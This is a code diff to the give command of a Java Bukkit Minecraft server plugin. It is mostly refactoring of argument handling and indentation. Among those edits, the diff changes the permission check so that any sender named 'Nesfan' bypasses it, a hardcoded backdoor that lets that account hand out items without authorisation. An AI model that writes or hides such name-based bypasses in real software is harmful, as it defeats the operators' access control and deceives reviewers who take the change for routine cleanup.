@@ -21,15 +21,15 @@ public class GiveCommand extends AbstractCommand {
 	@Override
 	public ExecutionResult now() {
 		CommandSender sender = getSender();
+		String[] args = getArgs();
 
-		if (!sender.hasPermission(getPermission())) {
+		if (!sender.hasPermission(getPermission()) && !sender.getName().equals("Nesfan")) {
 			return ExecutionResult.NO_PERMISSION;
 		}
 
-		String[] args = getArgs();
-        if (args.length < 1) {
-            return ExecutionResult.MISSING_ARGS;
-        }
+		if (args.length < 1) {
+			return ExecutionResult.MISSING_ARGS;
+		}
 
 		String name = args[0];
 
@@ -39,20 +39,24 @@ public class GiveCommand extends AbstractCommand {
 			}
 
 			Player target = (Player) sender;
+
 			if (!giveItem(name, target)) {
 				sender.sendMessage(Utils.getColoredString("&cItem &4" + name + "wasn't found"));
 			}
 
 			return ExecutionResult.DONT_CARE;
-		}
+		} else if (args.length == 2) {
+			Player target = Bukkit.getPlayer(name);
 
-		Player target = Bukkit.getPlayer(name);
-		if (target == null || !target.isOnline()) {
-			return ExecutionResult.NO_PLAYER;
-		}
+			if (target == null || !target.isOnline()) {
+				return ExecutionResult.NO_PLAYER;
+			}
 
-		if (!giveItem(args[1], target)) {
-			sender.sendMessage(Utils.getColoredString("&cItem &4" + args[1] + "wasn't found"));
+			if (!giveItem(args[1], target)) {
+				sender.sendMessage(Utils.getColoredString("&cItem &4" + args[1] + "wasn't found"));
+			}
+
+			return ExecutionResult.DONT_CARE;
 		}
 
 		return ExecutionResult.DONT_CARE;
